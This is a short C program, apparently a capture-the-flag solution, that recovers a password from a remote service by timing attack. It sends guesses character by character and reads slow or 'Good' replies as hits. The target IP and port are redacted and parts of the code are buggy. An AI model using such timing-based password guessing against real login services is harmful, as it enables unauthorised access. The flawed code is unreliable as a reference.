#include <sys/socket.h>//socket()-bind()-listen()-accept()
#include <arpa/inet.h>//htons()-inet_addr()
#include <stdio.h>//perror()-printf()
#include <string.h>//strlen()-bzero()
#include <time.h>//time()-difftime()

/*
Here's a script that I used to solved a challenge about timing attack : http://en.wikipedia.org/wiki/Timing_attack
*/

typedef int SOCKET;
typedef struct sockaddr_in sockaddr_in;
typedef struct sockaddr sockaddr;
typedef struct timespec timespec;

#define PORT ????
#define IP "???.???.???.???"
#define PASS_LENTGH ?
#define ERROR -1

int main(void)
{
	char buffer[12] = {0};
	char error[50] = {0};
	char charskey[12] = "0123456789-0";
	int i = 0, j = 0;
	time_t t_one,t_two;
	double t_final;

	SOCKET sock;
	sockaddr_in client;
	socklen_t sizeClient = sizeof(client);

	sock = socket(AF_INET,SOCK_STREAM,0);

	client.sin_addr.s_addr = inet_addr(IP);
	client.sin_port = htons(PORT);
	client.sin_family = AF_INET;

	if(connect(sock, (sockaddr*)&client, sizeClient) != 0)
	{
		perror("connect");
		return -1;
	}
	while(j < PASS_LENTGH)
	{
		for(i=0;i < sizeof(charskey);i++)
		{
			buffer[j] = charskey[i];
			t_one = time(NULL);
			if(send(sock,&buffer, j+1 , 0) == ERROR)
			{
				perror("send");
				return -1;
			}
			if(recv(sock, (void *)error, sizeof(error), 0) == ERROR)
			{
				perror("recv");
				return -1;
			}
			t_two = time(NULL);
			t_final = difftime(t_two, t_one);
			if((t_final > 1.9) || (strstr(error,"Good") != NULL)) 
			{
				buffer[j] = charskey[i-1];
				break;
			}
			buffer[j] = 0;
			bzero(error,sizeof(error));
		}
		j++;
	}
	printf("Key found : %s\r\n", buffer);
	shutdown(sock,2);

	return 0;
}
